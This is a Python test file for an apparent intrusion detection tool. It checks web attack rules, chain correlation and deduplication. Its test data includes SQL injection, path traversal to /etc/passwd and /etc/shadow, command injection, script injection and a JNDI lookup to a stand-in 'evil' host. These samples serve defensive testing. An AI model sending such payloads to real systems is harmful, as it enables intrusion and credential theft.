from pathlib import Path

import pytest

from erinix.core.events import Event, EventType, Source, WebInfo
from erinix.demo.scenarios import SCENARIOS
from erinix.engine import Correlator
from erinix.engine.matching import matches
from erinix.core.process_tree import ProcessTree
from erinix.rules import Severity, load_rules

RULES = Path(__file__).resolve().parents[2] / "rules"
SEC = 1_000_000_000


def req(ip="192.168.50.31", method="GET", target="/", status=200, ua="Mozilla/5.0", sec=0.0):
    info = WebInfo.build(remote_addr=ip, method=method, target=target, status=status, user_agent=ua)
    return Event(EventType.WEB_REQUEST, Source.LOG, payload=info, mono_ns=int(sec * SEC))


@pytest.fixture(scope="module")
def ruleset():
    rs = load_rules(RULES)
    assert rs.problems == ()
    return rs


def fired(ruleset, event):
    c = Correlator(ruleset)
    return {a.rule_id for a in c.process(event)}


# ---------------------------------------------------------------- detection
@pytest.mark.parametrize("target,rule", [
    ("/p?id=1%20UNION%20SELECT%20password%20FROM%20users--", "web-sqli-attempt"),
    ("/p?id=1%2520union%2520all%2520select%25201", "web-sqli-attempt"),
    ("/p?id=1/**/UNION/**/SELECT/**/1", "web-sqli-attempt"),
    ("/p?name=%27%20OR%20%271%27=%271", "web-sqli-attempt"),
    ("/p?id=1;SELECT%20SLEEP(5)", "web-sqli-attempt"),
    ("/view?page=../../../../etc/passwd", "web-path-traversal"),
    ("/view?page=..%2f..%2f..%2fetc%2fshadow", "web-path-traversal"),
    ("/view?page=%252e%252e%252fsecret", "web-path-traversal"),
    ("/ping?host=8.8.8.8;cat%20/var/data", "web-command-injection"),
    ("/ping?host=$(id)", "web-command-injection"),
    ("/s?q=<script>alert(1)</script>", "web-template-or-script-injection"),
    ("/s?q=%3CScRiPt%3Ealert(1)", "web-template-or-script-injection"),
    ("/s?q=${jndi:ldap://evil/a}", "web-template-or-script-injection"),
    ("/s?q={{7*7}}", "web-template-or-script-injection"),
])
def test_payloads_are_detected_even_when_obfuscated(ruleset, target, rule):
    assert rule in fired(ruleset, req(target=target))


def test_attack_tool_user_agents(ruleset):
    for ua in ("sqlmap/1.7.11#stable (https://sqlmap.org)", "Nikto/2.5.0", "gobuster/3.6", "Mozilla/5.00 (Nikto/2.1.5)"):
        assert "web-attack-tool-user-agent" in fired(ruleset, req(ua=ua))
    assert not fired(ruleset, req(ua="curl/8.5.0"))                 # curl alone is not an attack


# ----------------------------------------------------------- false positives
BENIGN = [
    "/", "/index.html", "/static/app.js", "/static/css/style.css?v=3", "/favicon.ico", "/robots.txt",
    "/products?id=7", "/products?sort=price&select=all", "/products/selection", "/union-members", "/unions",
    "/search?q=union+station", "/search?q=select+a+gift", "/search?q=how+to+sleep+better", "/blog/my--first--post",
    "/api/v1/items?limit=20&offset=40", "/api/token/refresh-not-login", "/about", "/contact?name=O%27Brien",
    "/files/report-2026.pdf", "/images/cat%20photo.png", "/category/etc", "/docs/passwd-policy", "/docs/script-tips",
    "/users/42/profile", "/health", "/cart?coupon=SAVE10", "/p?q=a%20or%20b", "/shop?brand=Nike&color=red",
]


@pytest.mark.parametrize("target", BENIGN)
def test_ordinary_requests_raise_no_indicator(ruleset, target):
    assert fired(ruleset, req(target=target)) == set()


# ---------------------------------------------------------------- the chains
def run(ruleset, events):
    c = Correlator(ruleset)
    out = []
    for e in events:
        out += c.process(e)
    return c, out


def test_recon_then_attack_grows_in_two_steps(ruleset):
    scan = [req(target=f"/missing{i}", status=404, sec=i * 0.2) for i in range(10)]
    _, alerts = run(ruleset, scan + [req(target="/p?id=1 union select 1", sec=5)])
    chain = [a for a in alerts if a.rule_id == "web-recon-then-attack"]
    assert [(a.steps_done, a.severity) for a in chain] == [(1, Severity.MEDIUM), (2, Severity.HIGH)]
    assert len({a.alert_id for a in chain}) == 1 and str(chain[-1].remote_addr) == "192.168.50.31"


def test_nine_missing_pages_are_not_a_scan(ruleset):
    _, alerts = run(ruleset, [req(target=f"/x{i}", status=404, sec=i) for i in range(9)] + [req(target="/p?id=1 union select 1", sec=10)])
    assert "web-recon-then-attack" not in {a.rule_id for a in alerts}


def test_scanning_from_two_addresses_is_not_added_up(ruleset):
    events = [req(ip="10.0.0.1" if i % 2 else "10.0.0.2", target=f"/x{i}", status=404, sec=i * 0.1) for i in range(18)]
    assert "web-recon-then-attack" not in {a.rule_id for a in run(ruleset, events)[1]}


def test_login_bruteforce_then_success(ruleset):
    fails = [req(method="POST", target="/login", status=401, sec=i * 0.4) for i in range(8)]
    _, alerts = run(ruleset, fails + [req(method="POST", target="/login", status=302, sec=5)])
    chain = [a for a in alerts if a.rule_id == "web-login-bruteforce-success"]
    assert [a.severity for a in chain] == [Severity.MEDIUM, Severity.CRITICAL] and chain[-1].complete


def test_a_normal_login_with_typos_is_quiet(ruleset):
    events = [req(method="POST", target="/login", status=401, sec=1), req(method="POST", target="/login", status=401, sec=3),
              req(method="POST", target="/login", status=302, sec=6)]
    assert run(ruleset, events)[1] == []


def test_get_requests_do_not_count_as_login_attempts(ruleset):
    events = [req(method="GET", target="/login", status=401, sec=i) for i in range(10)] + [req(method="POST", target="/login", status=302, sec=12)]
    assert run(ruleset, events)[1] == []


# ------------------------------------------------------------- de-duplication
def test_same_payload_from_same_source_alerts_once_then_again_after_five_minutes(ruleset):
    c = Correlator(ruleset)
    payload = "/p?id=1 union select 1"
    assert len(c.process(req(target=payload, sec=0))) == 1
    assert c.process(req(target=payload, sec=60)) == [] and c.stats.suppressed_duplicates == 1
    assert len(c.process(req(target=payload, sec=301))) == 1
    assert len(c.process(req(ip="10.9.9.9", target=payload, sec=302))) == 1      # another source: separate alert


# --------------------------------------------------------- schema and abuse
def write(tmp_path, body, name="r.toml"):
    f = tmp_path / name
    f.write_text("schema = 1\n" + body, encoding="utf-8")
    f.chmod(0o600)
    return f


def problems(tmp_path, body):
    return [p.message for p in load_rules(write(tmp_path, body)).problems]


IND = '[[indicator]]\nid = "t"\nevent = "web.request"\nseverity = "low"\n[indicator.match]\n'


def test_rule_values_are_normalized_like_requests(tmp_path):
    rs = load_rules(write(tmp_path, IND + 'contains = ["UNION%20SELECT", "Sleep("]\n'))
    assert rs.problems == () and rs.indicators[0].match["contains"] == ("union select", "sleep(")


@pytest.mark.parametrize("match,fragment", [
    ('contains = ["a"]', "at least 3 characters"), ('contains = ["  "]', "at least 3"), ('user_agent_contains = ["x"]', "at least 3"),
    ('contains = []', "list of 1-"), ('contains = "union select"', "list of 1-"), ('method = ["get"]', "upper-case"),
    ('method = ["GET /"]', "upper-case"), ('status = [99]', "allowed values"), ('status = [200, 700]', "allowed values"),
    ('status = [true]', "allowed values"), ('path = ["admin"]', "absolute"), ('regex = ["."]', "not allowed"),
    ('exe = ["/bin/sh"]', "not allowed"), ('contains = ["union select"]\nbogus = 1', "not allowed"),
])
def test_web_match_fields_are_validated(tmp_path, match, fragment):
    found = problems(tmp_path, IND + match + "\n")
    assert len(found) == 1 and fragment in found[0]


def test_web_events_cannot_use_process_links(tmp_path):
    chain = '''[[chain]]
id = "c"
window_seconds = 60
link = "{link}"
[[chain.step]]
id = "a"
event = "web.request"
severity = "low"
[chain.step.match]
status = [404]
[[chain.step]]
id = "b"
event = "web.request"
severity = "high"
[chain.step.match]
status = [200]
'''
    for link in ("process_tree", "login_session"):
        assert "must be tied to a process" in problems(tmp_path, chain.format(link=link))[0]
    assert problems(tmp_path, chain.format(link="remote_ip")) == []


def test_web_fields_do_not_match_other_event_types():
    tree = ProcessTree()
    from erinix.core.events import AuthInfo
    auth = Event(EventType.AUTH_FAILURE, Source.LOG, payload=AuthInfo.build(service="sshd", user="x", remote_addr="10.0.0.1"))
    for field, value in (("contains", ("root",)), ("status", (401,)), ("user_agent_contains", ("curl",))):
        assert not matches({field: value}, auth, tree)


def test_shipped_web_rules_are_present(ruleset):
    ids = {c.id for c in ruleset.chains} | {i.id for i in ruleset.indicators}
    assert {"web-sqli-attempt", "web-path-traversal", "web-command-injection", "web-template-or-script-injection",
            "web-attack-tool-user-agent", "web-recon-then-attack", "web-login-bruteforce-success"} <= ids


# ---------------------------------------------------------------- scenarios
def test_web_scenarios_end_to_end(ruleset):
    for name in ("web", "webquiet", "ssh"):
        sc = SCENARIOS[name]
        c, alerts = run(ruleset, sorted(sc.build(), key=lambda e: e.mono_ns))
        assert bool(alerts) == sc.expect_alerts, name
    _, alerts = run(ruleset, sorted(SCENARIOS["ssh"].build(), key=lambda e: e.mono_ns))
    assert {str(a.remote_addr) for a in alerts} == {"203.0.113.50"}          # the framed address is never blamed
    _, alerts = run(ruleset, sorted(SCENARIOS["web"].build(), key=lambda e: e.mono_ns))
    assert {"web-sqli-attempt", "web-path-traversal", "web-command-injection", "web-template-or-script-injection",
            "web-attack-tool-user-agent", "web-recon-then-attack", "web-login-bruteforce-success"} <= {a.rule_id for a in alerts}
